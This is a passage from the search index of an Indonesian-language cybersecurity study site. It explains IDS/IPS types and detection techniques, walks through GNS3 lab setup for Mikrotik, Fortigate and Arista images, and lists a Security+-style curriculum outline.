pelatihan, hasilnya akan sangat bermasalah. Poin penting lainnya adalah memastikan bahwa sistem terlatih dengan baik untuk mengenali aktivitas yang tidak berbahaya. Sistem Pencegahan Intrusi Nirkabel (WIPS) WIPS memantau arus lalu lintas dari jaringan nirkabel. Tujuannya adalah untuk melindungi lalu lintas nirkabel dan menghentikan kemungkinan serangan yang diluncurkan dari sana. Jika signature diidentifikasi, koneksi dihentikan. Sistem Pencegahan Intrusi Berbasis Host (HIPS) HIPS secara aktif melindungi arus lalu lintas dari satu perangkat titik akhir. Tujuannya adalah untuk menyelidiki lalu lintas pada perangkat tertentu. Jika signature diidentifikasi, koneksi dihentikan. Mekanisme kerja HIPS mirip dengan HIDS. Perbedaannya adalah bahwa sementara HIDS membuat peringatan untuk ancaman, HIPS menghentikan ancaman dengan memutuskan koneksi. Detection/Prevention Techniques \u00b6 Ada tiga teknik deteksi dan pencegahan utama yang digunakan dalam IDS dan IPS; Teknik Penjelasan Signature-Based Teknik ini bergantung pada aturan yang mengidentifikasi pola spesifik dari perilaku jahat yang diketahui. Model ini membantu mendeteksi ancaman yang diketahui. Behaviour-Based Teknik ini mengidentifikasi ancaman baru dengan pola baru yang melewati signature . Model membandingkan perilaku yang diketahui/normal dengan yang tidak diketahui/abnormal. Model ini membantu mendeteksi ancaman yang sebelumnya tidak diketahui atau baru. Policy-Based Teknik ini membandingkan aktivitas yang terdeteksi dengan konfigurasi sistem dan kebijakan keamanan. Model ini membantu mendeteksi pelanggaran kebijakan. Kesimpulan \u00b6 IDS dapat mengidentifikasi ancaman tetapi memerlukan bantuan pengguna untuk menghentikannya. IPS dapat mengidentifikasi dan memblokir ancaman dengan lebih sedikit bantuan pengguna pada waktu deteksi. Tools \u00b6 Snort","title":"IDS/IPS"},{"location":"cybersecurity/idsips/#idsips","text":"from tryhackme.com","title":"IDS/IPS"},{"location":"cybersecurity/idsips/#intrusion-detection-system-ids","text":"IDS adalah passive monitoring untuk mendeteksi kemungkinan aktivitas berbahaya, insiden abnormal, dan pelanggaran kebijakan. Bertanggung jawab untuk menghasilkan peringatan untuk setiap peristiwa yang mencurigakan. Terdapat 2 tipe IDS: Network Intrusion Detection System (NIDS) NIDS memonitor alur lalu lintas dari berbagai area jaringan. Tujuannya adalah untuk menyelidiki lalu lintas di seluruh subnet. jika signature diidentifikasi, maka akan dibuat alert . Host-based Intrusion Detection System (HIDS) HIDS memonitor arus lalu lintas dari satu perangkat titik akhir. Tujuannya adalah untuk menyelidiki lalu lintas pada perangkat tertentu. Jika signature diidentifikasi, maka akan dibuat alert .","title":"Intrusion Detection System (IDS)"},{"location":"cybersecurity/idsips/#intrusion-prevention-system-ips","text":"IPS adalah active protection untuk mencegah kemungkinan aktivitas berbahaya, insiden abnormal, dan pelanggaran kebijakan. Bertanggung jawab untuk menghentikan/mencegah/mengakhiri kejadian yang mencurigakan segera setelah deteksi dilakukan. Terdapat 4 tipe IDS: Network Intrusion Prevention System (NIPS) NIPS memonitor arus lalu lintas dari berbagai area jaringan. Tujuannya adalah untuk melindungi lalu lintas di seluruh subnet. Jika signature diidentifikasi, koneksi dihentikan. Network Behaviour Analysis (NBA) Sistem-berbasis-perilaku memantau lalu lintas lintas dari berbagai area jaringan. Tujuannya adalah untuk melindungi lalu lintas di seluruh subnet. Jika signature diidentifikasi, koneksi dihentikan. Sistem-Analisis-Perilaku Jaringan bekerja mirip dengan NIPS. Perbedaan antara NIPS dan Behavior-based adalah sistem-berbasis-perilaku memerlukan periode pelatihan (juga dikenal sebagai \"baselining\") untuk mempelajari lalu lintas normal dan membedakan lalu lintas dan ancaman berbahaya. Model ini memberikan hasil yang lebih efisien terhadap ancaman baru. Sistem dilatih untuk mengetahui \"normal\" untuk mendeteksi \"abnormal\". Periode pelatihan sangat penting untuk menghindari false positive . Jika terjadi pelanggaran keamanan selama periode pelatihan, hasilnya akan sangat bermasalah. Poin penting lainnya adalah memastikan bahwa sistem terlatih dengan baik untuk mengenali aktivitas yang tidak berbahaya. Sistem Pencegahan Intrusi Nirkabel (WIPS) WIPS memantau arus lalu lintas dari jaringan nirkabel. Tujuannya adalah untuk melindungi lalu lintas nirkabel dan menghentikan kemungkinan serangan yang diluncurkan dari sana. Jika signature diidentifikasi, koneksi dihentikan. Sistem Pencegahan Intrusi Berbasis Host (HIPS) HIPS secara aktif melindungi arus lalu lintas dari satu perangkat titik akhir. Tujuannya adalah untuk menyelidiki lalu lintas pada perangkat tertentu. Jika signature diidentifikasi, koneksi dihentikan. Mekanisme kerja HIPS mirip dengan HIDS. Perbedaannya adalah bahwa sementara HIDS membuat peringatan untuk ancaman, HIPS menghentikan ancaman dengan memutuskan koneksi.","title":"Intrusion Prevention System (IPS)"},{"location":"cybersecurity/idsips/#detectionprevention-techniques","text":"Ada tiga teknik deteksi dan pencegahan utama yang digunakan dalam IDS dan IPS; Teknik Penjelasan Signature-Based Teknik ini bergantung pada aturan yang mengidentifikasi pola spesifik dari perilaku jahat yang diketahui. Model ini membantu mendeteksi ancaman yang diketahui. Behaviour-Based Teknik ini mengidentifikasi ancaman baru dengan pola baru yang melewati signature . Model membandingkan perilaku yang diketahui/normal dengan yang tidak diketahui/abnormal. Model ini membantu mendeteksi ancaman yang sebelumnya tidak diketahui atau baru. Policy-Based Teknik ini membandingkan aktivitas yang terdeteksi dengan konfigurasi sistem dan kebijakan keamanan. Model ini membantu mendeteksi pelanggaran kebijakan.","title":"Detection/Prevention Techniques"},{"location":"cybersecurity/idsips/#kesimpulan","text":"IDS dapat mengidentifikasi ancaman tetapi memerlukan bantuan pengguna untuk menghentikannya. IPS dapat mengidentifikasi dan memblokir ancaman dengan lebih sedikit bantuan pengguna pada waktu deteksi.","title":"Kesimpulan"},{"location":"cybersecurity/idsips/#tools","text":"Snort","title":"Tools"},{"location":"cybersecurity/lab/","text":"Lab \u00b6 last update July 7 2022 GNS3 \u00b6 Instalasi GNS3 ubuntu 22.04 Mikrotik \u00b6 download mikrotik dan winbox pada official website Download Mikrotik \u00b6 Winbox \u00b6 Install Wine \u00b6 sudo apt install wine cp ~/Downloads/winbox.exe ~/.wine/drive_c/windows/ jalankan wine winbox # atau wine winbox.exe Membuat Dekstop Icon \u00b6 download winbox icon, atau dapat menggunakan link sudo nano /usr/share/applications/winbox.desktop isi dengan [Desktop Entry] Name=Mikrotik Winbox Comment=Remote Mikrotik Winbox Exec=wine winbox Terminal=false Type=Application Icon=/home/user/.wine/drive_c/windows/winbox.png jika icon tidak tampil, silahkan restart pc GNS3 Mikrotik dengan QEMU \u00b6 Edit >> Preferences >> QEMU >> Qemu VMS >> New Nama : Mikrotik (bebas) Qemu Binary : (otomatis) RAM : 64 Koneksi : Telnet >> New Image >> Browse >> (cari hasil download mikrotik) >> Finish Jika perlu , edit symbol menjadi Router dan edit juga jumlah adapter pada mikrotik Fortigate \u00b6 Download \u00b6 Attention percobaan dan penjelasan kali ini dilakukan pada sistem operasi Ubuntu 22.04, percobaan pada Windows memerlukan tools tambahan yaitu VMWare (direkomendasikan) dan GNS3 VM Server sebagai cloud , percobaan pada Kali Linux berakhir gagal , karena proses instalasi GNS3 yang terlalu ribet dan banyak error, dan gagal saat instalasi VMWare (telah gagal juga pada percobaan Virtualbox) login pada website https://support.fortinet.com pergi ke Support >> Download >> VM Images setelah berhasil mendownload, ekstrak dan diperoleh file fortios.qcow2 GNS3 >> Edit >> Preferences >> QEMU >> Qemu VMs >> New Nama : Fortigate 7.2.0 (bebas) Qemu Binary : (otomatis) RAM : 1024 Koneksi : Telnet >> Browse >> (cari file fortios.qcow2 ) >> Finish Jika perlu , edit symbol menjadi Fortigate dan edit juga jumlah adapter pada fortigate Run \u00b6 start fortigate dan buka console pada awalnya login dengan admin : (no password) , dan diminta untuk membuat password baru Configurasi Sederhana dengan DHCP \u00b6 agar tampil list port dan ip, lakukan edit ? Login dengan Website \u00b6 masukkan ip dhcp yang diperoleh Arista \u00b6 Download \u00b6 Pastikan sudah login ke dalam website arista (disarankan tidak login menggunakan email pribadi (@gmail.com), dapat menggunakan email kampus / perusahaan) pergi ke menu software download download Aboot-veos.iso dan vEOS-lab.vmdk , disini saya akan mendownload Aboot-veos-8.0.0.iso dan vEOS-lab-4.21.15M.vmdk download appliance buka GNS3 File >> import appliance >> ( arista-veos.gns3a ) vEOS version 4.21.1F |--> import file Aboot |--> import file vEOS (!) centang Allow custom files dan klik refresh Next, selesai tutorial arista Packettracer \u00b6 tutorial download packettracer","title":"Lab"},{"location":"cybersecurity/lab/#lab","text":"last update July 7 2022","title":"Lab"},{"location":"cybersecurity/lab/#gns3","text":"Instalasi GNS3 ubuntu 22.04","title":"GNS3"},{"location":"cybersecurity/lab/#mikrotik","text":"download mikrotik dan winbox pada official website","title":"Mikrotik"},{"location":"cybersecurity/lab/#download-mikrotik","text":"","title":"Download Mikrotik"},{"location":"cybersecurity/lab/#winbox","text":"","title":"Winbox"},{"location":"cybersecurity/lab/#install-wine","text":"sudo apt install wine cp ~/Downloads/winbox.exe ~/.wine/drive_c/windows/ jalankan wine winbox # atau wine winbox.exe","title":"Install Wine"},{"location":"cybersecurity/lab/#membuat-dekstop-icon","text":"download winbox icon, atau dapat menggunakan link sudo nano /usr/share/applications/winbox.desktop isi dengan [Desktop Entry] Name=Mikrotik Winbox Comment=Remote Mikrotik Winbox Exec=wine winbox Terminal=false Type=Application Icon=/home/user/.wine/drive_c/windows/winbox.png jika icon tidak tampil, silahkan restart pc","title":"Membuat Dekstop Icon"},{"location":"cybersecurity/lab/#gns3-mikrotik-dengan-qemu","text":"Edit >> Preferences >> QEMU >> Qemu VMS >> New Nama : Mikrotik (bebas) Qemu Binary : (otomatis) RAM : 64 Koneksi : Telnet >> New Image >> Browse >> (cari hasil download mikrotik) >> Finish Jika perlu , edit symbol menjadi Router dan edit juga jumlah adapter pada mikrotik","title":"GNS3 Mikrotik dengan QEMU"},{"location":"cybersecurity/lab/#fortigate","text":"","title":"Fortigate"},{"location":"cybersecurity/lab/#download","text":"Attention percobaan dan penjelasan kali ini dilakukan pada sistem operasi Ubuntu 22.04, percobaan pada Windows memerlukan tools tambahan yaitu VMWare (direkomendasikan) dan GNS3 VM Server sebagai cloud , percobaan pada Kali Linux berakhir gagal , karena proses instalasi GNS3 yang terlalu ribet dan banyak error, dan gagal saat instalasi VMWare (telah gagal juga pada percobaan Virtualbox) login pada website https://support.fortinet.com pergi ke Support >> Download >> VM Images setelah berhasil mendownload, ekstrak dan diperoleh file fortios.qcow2 GNS3 >> Edit >> Preferences >> QEMU >> Qemu VMs >> New Nama : Fortigate 7.2.0 (bebas) Qemu Binary : (otomatis) RAM : 1024 Koneksi : Telnet >> Browse >> (cari file fortios.qcow2 ) >> Finish Jika perlu , edit symbol menjadi Fortigate dan edit juga jumlah adapter pada fortigate","title":"Download"},{"location":"cybersecurity/lab/#run","text":"start fortigate dan buka console pada awalnya login dengan admin : (no password) , dan diminta untuk membuat password baru","title":"Run"},{"location":"cybersecurity/lab/#configurasi-sederhana-dengan-dhcp","text":"agar tampil list port dan ip, lakukan edit ?","title":"Configurasi Sederhana dengan DHCP"},{"location":"cybersecurity/lab/#login-dengan-website","text":"masukkan ip dhcp yang diperoleh","title":"Login dengan Website"},{"location":"cybersecurity/lab/#arista","text":"","title":"Arista"},{"location":"cybersecurity/lab/#download_1","text":"Pastikan sudah login ke dalam website arista (disarankan tidak login menggunakan email pribadi (@gmail.com), dapat menggunakan email kampus / perusahaan) pergi ke menu software download download Aboot-veos.iso dan vEOS-lab.vmdk , disini saya akan mendownload Aboot-veos-8.0.0.iso dan vEOS-lab-4.21.15M.vmdk download appliance buka GNS3 File >> import appliance >> ( arista-veos.gns3a ) vEOS version 4.21.1F |--> import file Aboot |--> import file vEOS (!) centang Allow custom files dan klik refresh Next, selesai tutorial arista","title":"Download"},{"location":"cybersecurity/lab/#packettracer","text":"tutorial download packettracer","title":"Packettracer"},{"location":"cybersecurity/tns/","text":"Topology & Networking \u00b6 Security Zone \u00b6 Single homed bastion host Dual homed bastion host Screened host gateway Screened subnet gateway Network Topology saran Cisco \u00b6 Campus Area Network Cloud, Wide-Area Network Data Center Network Small office/Home Office Virtual Environtment & Security \u00b6 Saat ini sedang banyak kantor / lembaga menggunakan virtual network dan virtual server di lingkungan internal, dan banyak provider cloud computing yang menawarkan sewa virtual network dan virtual server , salah satunya AWS. Dengan adanya provider ini, perusahaan yang memerlukan server tidak perlu menyediakan atau membeli server sendiri, tidak perlu membangun data center dan menyediakan infrastruktur sendiri. Perusahaan tersebut bisa menyewa virtual server lengkap dengan fasilitas keamanan, storage, dan fitur lainnya. keberadaan virtual network & server menyebabkan kebutuhan juga terhadap virtual security . maka dikembangkan pula solusi mengenai virtual security Implementasi AAA \u00b6 Untuk mempermudah pengelolaan user, Cisco menganjurkan agar pada network tersedia sebuah server AAA ( Authentication , Authorization , Accounting ). informasi login dan password semua pengguna network dapat dikelola secara terpusat. untuk melakukan ini, diperlukan 2 tahap pengerjaan : menginstall Access Control Server (ACS) melakukan konfigurasi router dan switch / perangkat lain agar menggunakan ACS","title":"Topology & Security"},{"location":"cybersecurity/tns/#topology-networking","text":"","title":"Topology &amp; Networking"},{"location":"cybersecurity/tns/#security-zone","text":"Single homed bastion host Dual homed bastion host Screened host gateway Screened subnet gateway","title":"Security Zone"},{"location":"cybersecurity/tns/#network-topology-saran-cisco","text":"Campus Area Network Cloud, Wide-Area Network Data Center Network Small office/Home Office","title":"Network Topology saran Cisco"},{"location":"cybersecurity/tns/#virtual-environtment-security","text":"Saat ini sedang banyak kantor / lembaga menggunakan virtual network dan virtual server di lingkungan internal, dan banyak provider cloud computing yang menawarkan sewa virtual network dan virtual server , salah satunya AWS. Dengan adanya provider ini, perusahaan yang memerlukan server tidak perlu menyediakan atau membeli server sendiri, tidak perlu membangun data center dan menyediakan infrastruktur sendiri. Perusahaan tersebut bisa menyewa virtual server lengkap dengan fasilitas keamanan, storage, dan fitur lainnya. keberadaan virtual network & server menyebabkan kebutuhan juga terhadap virtual security . maka dikembangkan pula solusi mengenai virtual security","title":"Virtual Environtment &amp; Security"},{"location":"cybersecurity/tns/#implementasi-aaa","text":"Untuk mempermudah pengelolaan user, Cisco menganjurkan agar pada network tersedia sebuah server AAA ( Authentication , Authorization , Accounting ). informasi login dan password semua pengguna network dapat dikelola secara terpusat. untuk melakukan ini, diperlukan 2 tahap pengerjaan : menginstall Access Control Server (ACS) melakukan konfigurasi router dan switch / perangkat lain agar menggunakan ACS","title":"Implementasi AAA"},{"location":"cybersecurity/securityp/","text":"Kurikulum \u00b6 Comparing Security Roles and Security Controls \u00b6 Compare and Contrast Information Security Roles Cybersecurity Framework Information Security Competencies Information Security Roles and Responsibilities Information Security Business Units Compare and Contrast Security Control And Framework Types Security Control Categories Security Control Functional Types NIST Cybersecurity Framework ISO and Cloud Frameworks Benchmarks and Secure Configuration Guides Regulations, Standards, and Legislation Lab 1 - Compare and Contrast Security Control and Framework Types (PBQ) kuis 01 Explaining Threat Actors and Threat Intelligence \u00b6 Explain Threat Actor Types and Attack Vectors Attributes of Threat Actors Hackers, Script Kiddies, and Hacktivists State Actors and Advanced Persistent Threats Criminal Syndicates and Competitors Insider Threat Actors Attack Surface and Attack Vectors Explain Threat Intelligence Sources Threat Research Sources Threat Intelligence Providers Other Threat Intelligence Research Sources Tactics, Techniques, and Procedures and Indicators of Compromise Threat Data Feeds Artificial Intelligence and Predictive Analysis kuis 02 Performing Security Assessment \u00b6 Assess Organizational Security with Network Reconnaissance Tools ipconfig, ping, and ARP route and traceroute IP Scanners and Nmap Service Discovery and Nmap netstat and nslookup Other Reconnaissance and Discovery Tools Packet Capture and tcpdump Packet Analysis and Wireshark Packet Injection and Replay Exploitation Frameworks Netcat Explain Security Concerns with General Vulnerability Types Zero-day and Legacy Platform Vulnerabilities Weak Host Configurations Weak Network Configurations Impacts from Vulnerabilities Third-Party Risks Summarize Vulnerability Scanning Techniques Vulnerability Scan Types Common Vulnerabilities and Exposures Intrusive versus Non-intrusive Scanning Credentialed versus Non-Credentialed Scanning False Positives, False Negatives, and Log Review Configuration Review Threat Hunting Explain Penetration Testing Concepts Rules of Engagement Exercise Types Passive and Active Reconnaissance Pen Test Attack Life Cycle Lab 3: Assess Organizational Security with Network Reconnaissance Tools (PBQ) kuis 03 Identifying Social Engineering and Malware \u00b6 Compare and Contrast Social Engineering Techniques Social Engineering Principles Impersonation and Trust Dumpster Diving and Tailgating Identity Fraud and Invoice Scams Phishing, Whaling, and Vishing Spam, Hoaxes, and Prepending Pharming and Credential Harvesting Influence Campaigns Analyze Indicators of Malware-Based Attacks Malware Classification Computer Viruses Computer Worms and Fileless Malware Spyware and Keyloggers Backdoors and Remote Access Trojans Rootkits Ransomware, Crypto-Malware, and Logic Bombs Malware Indicators Process Analysis Lab 4: Analyze Indicators of Malware-Based Attacks (PBQ) kuis 04 Summarizing Basic Cryptographic Concepts \u00b6 Compare and Contrast Cryptographic Ciphers Cryptographic Concepts Hashing Algorithms Encryption Ciphers and Keys Symmetric Encryption Stream and Block Ciphers Asymmetric Encryption Public Key Cryptography Algorithms Summarize Cryptographic Modes of Operation Digital Signatures Digital Envelopes and Key Exchange Digital Certificates Perfect Forward Secrecy Cipher Suites and Modes of Operation Authenticated Modes of Operation Summarize Cryptographic Use Cases and Weaknesses Cryptography Supporting Authentication and Non-repudiation Cryptography Supporting Confidentiality Cryptography Supporting Integrity and Resiliency Cryptographic Performance Limitations Cryptographic Security Limitations Longevity and Cryptographic Attacks Man-in-the-Middle and Downgrade Attacks Key Stretching and Salting Collisions and the Birthday Attack Summarize Other Cryptographic Technologies Quantum and Post-quantum Homomorphic Encryption Steganography kuis 05 Implementing Public Key Infrastructure \u00b6 Implement Certificates and Certificate Authorities Public and Private Key Usage Certificate Authorities PKI Trust Models Registration Authorities and CSRs Digital Certificates Certificate Attributes Subject Name Attributes Types of Certificate Web Server Certificate Types Other Certificate Types Implement PKI Management Certificate and Key Management Key Recovery and Escrow Certificate Expiration Certificate Revocation Lists Online Certificate Status Protocol Responders Certificate Pinning Certificate Formats OpenSSL Certificate Issues Lab 6: Implement Certificates and Certificate Authorities (PBQ) kuis 06 Implementing Authentication Controls \u00b6 Summarize Authentication Design Concepts Identity and Access Management Authentication Factors Authentication Design Multifactor Authentication Authentication Attributes Implement Knowledge-Based Authentication Local, Network, and Remote Authentication Kerberos Authentication Kerberos Authorization PAP, CHAP, and MS-CHAP Authentication Password Attacks Brute Force and Dictionary Attacks Password Crackers Authentication Management Implement Authentication Technologies Key Management Devices Extensible Authentication Protocol/IEEE 802.1X Remote Authentication Dial-in User Service Terminal Access Controller Access-Control System Token Keys and Static Codes Open Authentication 2-Step Verification Summarize Biometrics Authentication Concepts Fingerprint Recognition Facial Recognition Behavioral Technologies Lab 7: Implement Knowledge-Based Authentication (PBQ) kuis 07 Implementing Identity and Account Management Controls \u00b6 Implement Identity and Account Types Identity Management Controls Background Check and Onboarding Policies Personnel Policies for Privilege Management Offboarding Policies Security Account Types and Credential Management Security Group-Based Privileges Administrator/Root Accounts Service Accounts Shared/Generic/Device Accounts and Credentials Secure Shell Keys and Third-party Credentials Implement Account Policies Account Attributes and Access Policies Account Password Policy Settings Account Restrictions Account Audits Account Permissions Usage Audits Account Lockout and Disablement Implement Authorization Solutions Discretionary and Role-Based Access Control File System Permissions Mandatory and Attribute-Based Access Control Rule-Based Access Control Directory Services Federation and Attestation Security Assertions Markup Language OAuth and OpenID Connect Explain the Importance of Personnel Policies Conduct Policies User and Role-based Training Diversity of Training Techniques Lab 8: Implement Identity and Account Types; Implement Account Policies (PBQ) kuis 08 Implementing Secure Network Designs \u00b6 Environment Lab Preparation [ID] Implement Secure Network Designs Business Workflows and Network Architecture Network Appliances Routing and Switching Protocols Network Segmentation Network Topology and Zones Demilitarized Zones Demilitarized Zone Topologies Screened Hosts Implications of IPv6 Other Secure Network Design Considerations Implement Secure Switching and Routing Man-in-the-Middle and Layer 2 Attacks ARP Poisoning and MAC Flooding Attacks Loop Prevention Physical Port Security and MAC Filtering Network Access Control Route Security Implement Secure Wireless Infrastructure Wireless Network Installation Considerations Controller and Access Point Security Wi-Fi Protected Access Wi-Fi Authentication Methods Wi-Fi Protected Setup Open Authentication and Captive Portals Enterprise/IEEE 802.1X Authentication Extensible Authentication Protocol PEAP, EAP-TTLS, and EAP-FAST RADIUS Federation Rogue Access Points and Evil Twins Disassociation and Replay Attacks Jamming Attacks Implement Load Balancers Distributed Denial of Service Attacks Amplification, Application, and OT Attacks Distributed Denial of Service Attack Mitigation Load Balancing Clustering Quality of Service (QoS) Lab 9: Implement Secure Switching and Routing (PBQ) Lab 9.1: Firewall NAT Rules kuis 09 Implementing Network Security Appliances \u00b6 Implement Firewalls and Proxy Servers Packet Filtering Firewalls Stateful Inspection Firewalls iptables Firewall Implementation Proxies and Gateways Access Control Lists Network Address Translation Virtual Firewalls Open-source versus Proprietary Firewalls Implement Network Security Monitoring Network-Based Intrusion Detection Systems TAPs and Port Mirrors Network-Based Intrusion Prevention Systems Signature-Based Detection Behavior and Anomaly-Based Detection Next-generation Firewalls and Content Filters Host-Based Intrusion Detection Systems Web Application Firewalls Summarize the Use of SIEM Monitoring Services Security Information and Event Management Analysis and Report Review File Manipulation Regular Expressions and grep Lab 10: Implement Firewalls and Proxy Servers (PBQ) Lab 10.1: Intrusion Detection/Prevention System [ID] kuis 10 Implementing Secure Network Protocols \u00b6 Implement Secure Network Operations Protocols DOMAIN NAME RESOLUTION DNS POISONING DNS SECURITY SECURE DIRECTORY SERVICES TIME SYNCHRONIZATION Implement Secure Application Protocols TRANSPORT LAYER SECURITY API CONSIDERATIONS FILE TRANSFER SERVICES EMAIL SERVICES SECURE/MULTIPURPOSE INTERNET MAIL EXTENSIONS VOICE AND VIDEO SERVICES Implement Secure Remote Access Protocols TRANSPORT LAYER SECURITY VPN INTERNET PROTOCOL SECURITY IPSEC TRANSPORT AND TUNNEL MODES INTERNET KEY EXCHANGE LAYER 2 TUNNELING PROTOCOL AND IKE V2 VPN CLIENT CONFIGURATION REMOTE DESKTOP OUT-OF-BAND MANAGEMENT AND JUMP SERVERS SECURE SHELL Lab 11: Implement Secure Remote Access Protocols (PBQ) kuis 11 Implementing Host Security Solutions \u00b6 Implement Secure Firmware HARDWARE ROOT OF TRUST BOOT INTEGRITY DISK ENCRYPTION USB AND FLASH DRIVE SECURITY THIRD-PARTY RISK MANAGEMENT END OF LIFE SYSTEMS Implement Endpoint Security BASELINE CONFIGURATION AND REGISTRY SETTINGS PATCH MANAGEMENT ENDPOINT PROTECTION NEXT-GENERATION ENDPOINT PROTECTION ANTIVIRUS RESPONSE Explain Embedded System Security Implications LOGIC CONTROLLERS FOR EMBEDDED SYSTEMS EMBEDDED SYSTEMS COMMUNICATIONS CONSIDERATIONS INDUSTRIAL CONTROL SYSTEMS INTERNET OF THINGS SPECIALIZED SYSTEMS FOR FACILITY AUTOMATION SPECIALIZED SYSTEMS IN IT SPECIALIZED SYSTEMS FOR VEHICLES AND DRONES SECURITY FOR EMBEDDED SYSTEMS kuis 12 Implementing Secure Mobile Solutions \u00b6 Implement Mobile Device Management ENTERPRISE MOBILITY MANAGEMENT IOS IN THE ENTERPRISE ANDROID IN THE ENTERPRISE MOBILE ACCESS CONTROL SYSTEMS REMOTE WIPE LOCATION SERVICES APPLICATION MANAGEMENT CONTENT MANAGEMENT Implement Secure Mobile Device Connections CELLULAR AND GPS CONNECTION METHODS WI-FI AND TETHERING CONNECTION METHODS BLUETOOTH CONNECTION METHODS INFRARED AND RFID CONNECTION METHODS NEAR FIELD COMMUNICATIONS AND MOBILE PAYMENT SERVICES USB CONNECTION METHODS FIRMWARE OVER-THE-AIR UPDATES Lab 13: Implement Mobile Device Management (PBQ) kuis 13 Summarizing Secure Application Concepts \u00b6 Analyze Indicators of Application Attacks APPLICATION ATTACKS OVERFLOW VULNERABILITIES NULL POINTER DEREFERENCING AND RACE CONDITIONS MEMORY LEAKS AND RESOURCE EXHAUSTION DLL INJECTION AND DRIVER MANIPULATION PASS THE HASH ATTACK Analyze Indicators of Web Application Attacks UNIFORM RESOURCE LOCATOR ANALYSIS APPLICATION PROGRAMMING INTERFACE ATTACKS REPLAY ATTACKS SESSION HIJACKING AND CROSS-SITE REQUEST FORGERY CROSS-SITE SCRIPTING STRUCTURED QUERY LANGUAGE INJECTION ATTACKS XML AND LDAP INJECTION ATTACKS DIRECTORY TRAVERSAL AND COMMAND INJECTION ATTACKS SERVER-SIDE REQUEST FORGERY Summarize Secure Coding Practices SECURE CODING TECHNIQUES SERVER-SIDE VERSUS CLIENT-SIDE VALIDATION DATA EXPOSURE AND MEMORY MANAGEMENT SECURE CODE USAGE STATIC CODE ANALYSIS Implement Secure Script Environments SCRIPTING PYTHON SCRIPT ENVIRONMENT POWERSHELL SCRIPT ENVIRONMENT EXECUTION CONTROL MALICIOUS CODE INDICATORS POWERSHELL MALICIOUS INDICATORS BASH AND PYTHON MALICIOUS INDICATORS MACROS AND VISUAL BASIC FOR APPLICATIONS (VBA) MAN-IN-THE-BROWSER ATTACK Summarize Deployment and Automation Concepts SECURE APPLICATION DEVELOPMENT ENVIRONMENTS PROVISIONING, DEPROVISIONING, AND VERSION CONTROL AUTOMATION/SCRIPTING RELEASE PARADIGMS SOFTWARE DIVERSITY Lab 14: Implement Secure Script Environments (PBQ) Lab 14.1: Enkripsi Disk dengan Linux Unified Key Setup (LUKS) kuis 14 Implementing Secure Cloud Solutions \u00b6 Summarize Secure Cloud and Virtualization Services CLOUD DEPLOYMENT MODELS CLOUD SERVICE MODELS ANYTHING AS A SERVICE SECURITY AS A SERVICE VIRTUALIZATION TECHNOLOGIES AND HYPERVISOR TYPES VIRTUAL DESKTOP INFRASTRUCTURE AND THIN CLIENTS APPLICATION VIRTUALIZATION AND CONTAINER VIRTUALIZATION VM ESCAPE PROTECTION VM SPRAWL AVOIDANCE Apply Cloud Security Solutions CLOUD SECURITY INTEGRATION AND AUDITING CLOUD SECURITY CONTROLS CLOUD COMPUTE SECURITY CLOUD STORAGE SECURITY HIGH AVAILABILITY CLOUD NETWORKING SECURITY VPCS AND TRANSIT GATEWAYS VPC ENDPOINTS CLOUD FIREWALL SECURITY SECURITY GROUPS CLOUD ACCESS SECURITY BROKERS Summarize Infrastructure as Code Concepts SERVICES INTEGRATION AND MICROSERVICES APPLICATION PROGRAMMING INTERFACES SERVERLESS ARCHITECTURE INFRASTRUCTURE AS CODE SOFTWARE-DEFINED NETWORKING SOFTWARE-DEFINED VISIBILITY FOG AND EDGE COMPUTING Lab 15: Apply Cloud Security Solutions (PBQ) Lab 15.1: Linux Security Assessment Dengan OpenSCAP kuis 15 Explaining Data Privacy and Protection Concepts \u00b6 Explain Privacy and Data Sensitivity Concepts PRIVACY AND SENSITIVE DATA CONCEPTS DATA ROLES AND RESPONSIBILITIES DATA CLASSIFICATIONS DATA TYPES PRIVACY NOTICES AND DATA RETENTION DATA SOVEREIGNTY AND GEOGRAPHICAL CONSIDERATIONS PRIVACY BREACHES AND DATA BREACHES DATA SHARING AND PRIVACY TERMS OF AGREEMENT Explain Privacy and Data Protection Controls DATA PROTECTION DATA EXFILTRATION DATA LOSS PREVENTION RIGHTS MANAGEMENT SERVICES PRIVACY ENHANCING TECHNOLOGIES DATABASE DEIDENTIFICATION METHODS Lab 16: Explain Privacy and Data Sensitivity Concepts (PBQ) kuis 16 Performing Incident Response \u00b6 Summarize Incident Response Procedures INCIDENT RESPONSE PROCESS CYBER INCIDENT RESPONSE TEAM COMMUNICATION PLAN AND STAKEHOLDER MANAGEMENT INCIDENT RESPONSE PLAN CYBER KILL CHAIN ATTACK FRAMEWORK OTHER ATTACK FRAMEWORKS INCIDENT RESPONSE EXERCISES INCIDENT RESPONSE, DISASTER RECOVERY, AND RETENTION POLICY Utilize Appropriate Data Sources for Incident Response INCIDENT IDENTIFICATION SECURITY AND INFORMATION EVENT MANAGEMENT SIEM DASHBOARDS TREND ANALYSIS LOGGING PLATFORMS NETWORK, OS, AND SECURITY LOG FILES APPLICATION LOG FILES METADATA NETWORK DATA SOURCES Apply Mitigation Controls INCIDENT CONTAINMENT INCIDENT ERADICATION AND RECOVERY FIREWALL CONFIGURATION CHANGES CONTENT FILTER CONFIGURATION CHANGES ENDPOINT CONFIGURATION CHANGES SECURITY ORCHESTRATION, AUTOMATION, AND RESPONSE ADVERSARIAL ARTIFICIAL INTELLIGENCE Lab 17: Summarize Incident Response Procedures (PBQ) kuis 17 Explaining Digital Forensics \u00b6 Explain Key Aspects of Digital Forensics Documentation KEY ASPECTS OF DIGITAL FORENSICS DIGITAL FORENSICS REPORTS AND E-DISCOVERY VIDEO AND WITNESS INTERVIEWS TIMELINES EVENT LOGS AND NETWORK TRAFFIC STRATEGIC INTELLIGENCE AND COUNTERINTELLIGENCE Explain Key Aspects of Digital Forensics Evidence Acquisition DATA ACQUISITION AND ORDER OF VOLATILITY DIGITAL FORENSICS SOFTWARE SYSTEM MEMORY ACQUISITION DISK IMAGE ACQUISITION PRESERVATION AND INTEGRITY OF EVIDENCE ACQUISITION OF OTHER DATA DIGITAL FORENSICS FOR CLOUD kuis 18 Summarizing Risk Management Concepts \u00b6 Explain Risk Management Processes and Concepts RISK MANAGEMENT PROCESSES RISK TYPES QUANTITATIVE RISK ASSESSMENT QUALITATIVE RISK ASSESSMENT RISK MANAGEMENT STRATEGIES RISK AVOIDANCE AND RISK TRANSFERENCE RISK ACCEPTANCE AND RISK APPETITE RISK AWARENESS Explain Business Impact Analysis Concepts MISSION ESSENTIAL FUNCTIONS IDENTIFICATION OF CRITICAL SYSTEMS SINGLE POINTS OF FAILURE DISASTERS DISASTER RECOVERY PLANS And 